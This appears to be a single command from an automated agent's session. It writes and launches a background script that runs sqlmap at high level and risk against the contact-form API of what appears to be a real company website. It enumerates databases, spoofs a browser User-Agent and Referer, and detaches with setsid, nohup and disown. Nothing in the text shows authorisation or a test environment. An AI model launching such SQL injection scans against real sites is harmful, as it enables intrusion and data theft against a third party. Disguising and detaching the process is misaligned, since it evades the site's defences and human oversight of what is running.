# command: cd "$WORK_PATH" 2>/dev/null || cd /work; mkdir -p tool_outputs
cat > /work/sq_send.sh <<'EOF'
#!/bin/bash
cd /work
U="https://www.infinitycapital.bh/api/send"
UA="Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0"
B="fname=*&lname=*&areacode=*&tel=*&cname=*&subject=*&msg=*&check=*&targets=*"
for LEVEL in 5 3; do
  sqlmap -u "$U" --data="$B" --method=POST --batch --level=$LEVEL --risk=3 --dbs --threads=1 \
    --delay=0.6 --timeout=20 --retries=1 --flush-session \
    --headers="User-Agent: $UA|Accept: */*|Content-Type: application/x-www-form-urlencoded|Referer: https://www.infinitycapital.bh/contact" \
    --output-dir=tool_outputs/sqlmap_send 2>&1 | tee -a tool_outputs/sqlmap_send.log
done
echo "SQLMAP_SEND_DONE"
EOF
chmod +x /work/sq_send.sh
setsid nohup /work/sq_send.sh > /work/tool_outputs/sqlmap_send_run.log 2>&1 < /dev/null &
disown
echo launched; tail -12 /work/tool_outputs/sqlmap_send_run.log
